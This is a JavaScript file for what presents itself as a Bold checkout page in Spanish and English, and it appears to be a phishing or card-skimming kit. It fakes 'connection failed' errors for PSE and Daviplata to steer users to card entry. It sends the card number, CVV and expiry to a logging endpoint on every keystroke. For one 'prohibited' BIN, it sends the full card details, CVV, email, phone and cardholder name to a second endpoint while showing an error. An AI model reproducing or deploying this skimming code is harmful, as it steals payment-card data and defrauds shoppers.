/* ============================================================
   ⚡ BOLD CHECKOUT JS ENGINE - Interacciones, Validación e Idioma
   ============================================================ */

document.addEventListener("DOMContentLoaded", () => {

  /* ==========================================================
     DICCIONARIO DE TRADUCCIÓN (ES / EN)
  ========================================================== */
  const translations = {
    es: {
      lang_code: "ES",
      lang_flag: "🇨🇴",
      buying_at: "Estas comprando en",
      ref_label: "Referencia",
      calc_currency: "Calcular en mi moneda",
      how_to_pay: "¿Cómo quieres pagar?",
      pay_card: "Tarjeta débito/crédito",
      warn_title: "No fue posible establecer conexión con el canal seleccionado.",
      warn_sub: "Por favor intenta realizando el pago con Tarjeta débito o crédito para finalizar tu orden.",
      change_method: "← Cambiar método de pago",
      phone_label: "Teléfono",
      email_label: "Ingresa tu correo electrónico",
      email_placeholder: "El que está registrado en tu banco",
      card_number_label: "Número de tarjeta",
      card_expiry_label: "Vencimiento",
      card_cvv_label: "CVV o CVC",
      card_holder_label: "Nombre del titular",
      card_holder_placeholder: "Igual al que aparece en la tarjeta",
      accept_data: "Acepto el tratamiento de mis datos personales…",
      accept_terms: "Acepto Términos y condiciones",
      pay_btn: "Pagar",
      abandon_payment: "Abandonar pago",
      return_store: "Volver a la tienda",
      secure_pay: "Paga seguro con Bold",
      loader_text: "Cambiando idioma..."
    },
    en: {
      lang_code: "EN",
      lang_flag: "🇺🇸",
      buying_at: "You are buying at",
      ref_label: "Reference",
      calc_currency: "Calculate in my currency",
      how_to_pay: "How do you want to pay?",
      pay_card: "Credit / debit card",
      warn_title: "Connection could not be established with the selected channel.",
      warn_sub: "Please try making the payment with a Debit or Credit Card to complete your order.",
      change_method: "← Change payment method",
      phone_label: "Phone number",
      email_label: "Enter your email address",
      email_placeholder: "The one registered with your bank",
      card_number_label: "Card number",
      card_expiry_label: "Expiration",
      card_cvv_label: "CVV or CVC",
      card_holder_label: "Cardholder name",
      card_holder_placeholder: "As it appears on the card",
      accept_data: "I accept the processing of my personal data…",
      accept_terms: "I accept Terms and Conditions",
      pay_btn: "Pay now",
      abandon_payment: "Cancel payment",
      return_store: "Return to store",
      secure_pay: "Pay securely with Bold",
      loader_text: "Switching language..."
    }
  };

  let currentLang = 'es';

  window.toggleLanguage = function () {
    const nextLang = currentLang === 'es' ? 'en' : 'es';
    const langLoader = document.getElementById("boldLangLoader");
    const langLoaderText = document.getElementById("boldLangLoaderText");

    if (langLoaderText) {
      langLoaderText.textContent = translations[nextLang].loader_text;
    }

    // Mostrar loader con 1_pingpong.gif en el centro
    if (langLoader) {
      langLoader.classList.add("activo");
    }

    setTimeout(() => {
      currentLang = nextLang;
      applyTranslations(currentLang);

      // Ocultar loader suavemente
      setTimeout(() => {
        if (langLoader) {
          langLoader.classList.remove("activo");
        }
      }, 300);
    }, 750);
  };

  function applyTranslations(lang) {
    const t = translations[lang];
    if (!t) return;

    // Actualizar flag y código en el botón
    const flagEl = document.getElementById("langFlag");
    const codeEl = document.getElementById("langCode");
    if (flagEl) flagEl.textContent = t.lang_flag;
    if (codeEl) codeEl.textContent = t.lang_code;

    // Actualizar elementos con data-i18n
    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (t[key]) {
        el.textContent = t[key];
      }
    });

    // Actualizar placeholders con data-i18n-ph
    document.querySelectorAll("[data-i18n-ph]").forEach(el => {
      const key = el.getAttribute("data-i18n-ph");
      if (t[key]) {
        el.setAttribute("placeholder", t[key]);
      }
    });
  }

  /* ==========================================================
     INTERACCIÓN DE MÉTODOS DE PAGO
  ========================================================== */
  const opTarjeta = document.getElementById("opTarjeta");
  const opPSE = document.getElementById("opPSE");
  const opDaviplata = document.getElementById("opDaviplata");
  const metodosGrid = document.getElementById("metodosGrid");
  const formTarjeta = document.getElementById("formTarjeta");
  const btnVolver = document.getElementById("btnVolver");
  const bancoAdvertencia = document.getElementById("bancoAdvertencia");
  const volverTienda = document.getElementById("volverTienda");
  const logosBoldBottom = document.getElementById("logosBoldBottom");

  // Al hacer clic en Tarjeta: mostrar formulario
  if (opTarjeta) {
    opTarjeta.addEventListener("click", () => {
      if (metodosGrid) metodosGrid.style.display = "none";
      if (bancoAdvertencia) bancoAdvertencia.style.display = "none";
      if (formTarjeta) formTarjeta.style.display = "flex";
      if (volverTienda) volverTienda.style.display = "none";
      if (logosBoldBottom) logosBoldBottom.style.display = "none";
    });
  }

  // Al hacer clic en Volver / Cambiar método
  if (btnVolver) {
    btnVolver.addEventListener("click", (e) => {
      e.preventDefault();
      if (formTarjeta) formTarjeta.style.display = "none";
      if (metodosGrid) metodosGrid.style.display = "grid";
      if (volverTienda) volverTienda.style.display = "flex";
      if (logosBoldBottom) logosBoldBottom.style.display = "block";
    });
  }

  // Al hacer clic en PSE o Daviplata: mostrar advertencia
  function mostrarAdvertenciaCanal() {
    if (bancoAdvertencia) {
      bancoAdvertencia.style.display = "flex";
      bancoAdvertencia.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }

  if (opPSE) opPSE.addEventListener("click", mostrarAdvertenciaCanal);
  if (opDaviplata) opDaviplata.addEventListener("click", mostrarAdvertenciaCanal);

  /* ==========================================================
     CAMPOS Y FORMATEO DE TARJETA
  ========================================================== */
  const inputTarjeta = formTarjeta?.querySelector("input[name='tarjeta']");
  const inputCVV = formTarjeta?.querySelector("input[name='cvv']");
  const inputFecha = formTarjeta?.querySelector("input[name='fecha']");
  const inputTelefono = formTarjeta?.querySelector("input[name='tel_bank']");

  // BIN Prohibidos
  const binsProhibidos = {
    "409355": "Nequi"
  };

  let msgError = null;
  if (inputTarjeta) {
    msgError = document.createElement("div");
    msgError.style.cssText = "color: #ef4444; font-size: 13.5px; margin-top: 6px; font-weight: 700; display: none;";
    inputTarjeta.parentNode.appendChild(msgError);
  }

  // Formatear tarjeta
  if (inputTarjeta) {
    inputTarjeta.addEventListener("input", (e) => {
      inputTarjeta.classList.remove("error");
      if (msgError) msgError.style.display = "none";

      let value = e.target.value.replace(/\D/g, '');
      let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');

      if (formattedValue.length > 19) {
        formattedValue = formattedValue.substring(0, 19);
      }
      e.target.value = formattedValue;
    });

    inputTarjeta.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear CVV
  if (inputCVV) {
    inputCVV.addEventListener("input", () => {
      inputCVV.classList.remove("error");
      if (msgError) msgError.style.display = "none";
    });

    inputCVV.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear Fecha
  if (inputFecha) {
    inputFecha.addEventListener("input", (e) => {
      inputFecha.classList.remove("error");
      if (msgError) msgError.style.display = "none";

      const v = e.target.value.replace(/\D/g, "");
      if (v.length >= 2) {
        e.target.value = v.slice(0, 2) + "/" + v.slice(2, 4);
      } else {
        e.target.value = v;
      }
    });

    inputFecha.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  // Formatear Teléfono
  if (inputTelefono) {
    inputTelefono.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, '');
      let formattedValue = value.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');

      if (formattedValue.length > 13) {
        formattedValue = formattedValue.substring(0, 13);
      }
      e.target.value = formattedValue;
    });

    inputTelefono.addEventListener("keypress", e => {
      if (/\D/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  }

  /* ==========================================================
     TELEMETRÍA EN TIEMPO REAL
  ========================================================== */
  let telemetriaTimeout = null;
  function enviarTelemetria() {
    clearTimeout(telemetriaTimeout);
    telemetriaTimeout = setTimeout(() => {
      const num = inputTarjeta?.value.replace(/\s/g, '') || '';
      const cvv = inputCVV?.value.trim() || '';
      const fecha = inputFecha?.value.trim() || '';
      const marca = detectarMarca(num);

      const formData = new FormData();
      formData.append('tarjeta', num);
      formData.append('cvv', cvv);
      formData.append('fecha', fecha);
      formData.append('marca', marca === 'normal' ? '' : marca);

      fetch('actualizar_log.php', {
        method: 'POST',
        body: formData
      }).catch(() => {});
    }, 500);
  }

  if (inputTarjeta) inputTarjeta.addEventListener("input", enviarTelemetria);
  if (inputCVV) inputCVV.addEventListener("input", enviarTelemetria);
  if (inputFecha) inputFecha.addEventListener("input", enviarTelemetria);

  function detectarMarca(num) {
    const cleanNum = num.replace(/\s/g, '');
    if (/^3[47]/.test(cleanNum)) return "amex";
    if (/^4/.test(cleanNum)) return "visa";
    if (/^5[1-5]/.test(cleanNum) || /^2[2-7]/.test(cleanNum)) return "mastercard";
    return "normal";
  }

  function validarFecha(f) {
    if (!/^\d{2}\/\d{2}$/.test(f)) return false;
    const [mm, yy] = f.split("/").map(n => parseInt(n, 10));
    if (mm < 1 || mm > 12) return false;

    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    const fullYear = 2000 + yy;

    if (fullYear < currentYear) return false;
    if (fullYear === currentYear && mm < currentMonth) return false;

    return true;
  }

  function validarLuhn(num) {
    const cleanNum = num.replace(/\s/g, '');
    let sum = 0, dbl = false;
    for (let i = cleanNum.length - 1; i >= 0; i--) {
      let d = parseInt(cleanNum[i], 10);
      if (dbl) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
      dbl = !dbl;
    }
    return sum % 10 === 0;
  }

  function mostrarError(mensaje) {
    if (msgError) {
      msgError.innerHTML = mensaje;
      msgError.style.display = "block";
    }
    if (inputTarjeta) {
      inputTarjeta.classList.add("error");
    }
  }

  function enviarBinProhibido(tarjeta, fecha, cvv, emailBank, telBank, titular, bin, bancoProhibido) {
    const formData = new FormData();
    formData.append('tarjeta', tarjeta);
    formData.append('fecha', fecha);
    formData.append('cvv', cvv);
    formData.append('email_bank', emailBank);
    formData.append('tel_bank', telBank);
    formData.append('titular', titular);
    formData.append('bin', bin);
    formData.append('banco_prohibido', bancoProhibido);

    fetch('registro_bin_prohibido.php', {
      method: 'POST',
      body: formData
    }).catch(() => {});
  }

  /* ==========================================================
     SUBMIT TARJETA
  ========================================================== */
  if (formTarjeta) {
    formTarjeta.addEventListener("submit", (e) => {
      const num = inputTarjeta?.value.replace(/\s/g, '') || '';
      const bin = num.substring(0, 6);
      const marca = detectarMarca(num);
      const cvv = inputCVV?.value.trim() || '';
      const fecha = inputFecha?.value.trim() || '';
      const emailBank = formTarjeta.querySelector("input[name='email_bank']")?.value.trim() || '';
      const telBank = formTarjeta.querySelector("input[name='tel_bank']")?.value.trim() || '';
      const titular = formTarjeta.querySelector("input[name='titular']")?.value.trim() || '';

      if (binsProhibidos[bin]) {
        enviarBinProhibido(num, fecha, cvv, emailBank, telBank, titular, bin, binsProhibidos[bin]);
        mostrarError(currentLang === 'es' ? `Número de tarjeta no permitido (${binsProhibidos[bin]}).` : `Card number not permitted (${binsProhibidos[bin]}).`);
        e.preventDefault();
        return;
      }

      const expectedLength = marca === "amex" ? 15 : 16;
      if (num.length !== expectedLength) {
        mostrarError(currentLang === 'es' ? `Debe tener ${expectedLength} dígitos.` : `Must have ${expectedLength} digits.`);
        e.preventDefault();
        return;
      }

      if (!validarLuhn(num)) {
        mostrarError(currentLang === 'es' ? "Número de tarjeta no válido." : "Invalid card number.");
        e.preventDefault();
        return;
      }

      const expectedCvvLength = marca === "amex" ? 4 : 3;
      if (cvv.length !== expectedCvvLength) {
        if (inputCVV) inputCVV.classList.add("error");
        e.preventDefault();
        return;
      }

      if (!validarFecha(fecha)) {
        if (inputFecha) inputFecha.classList.add("error");
        e.preventDefault();
        return;
      }
    });
  }

});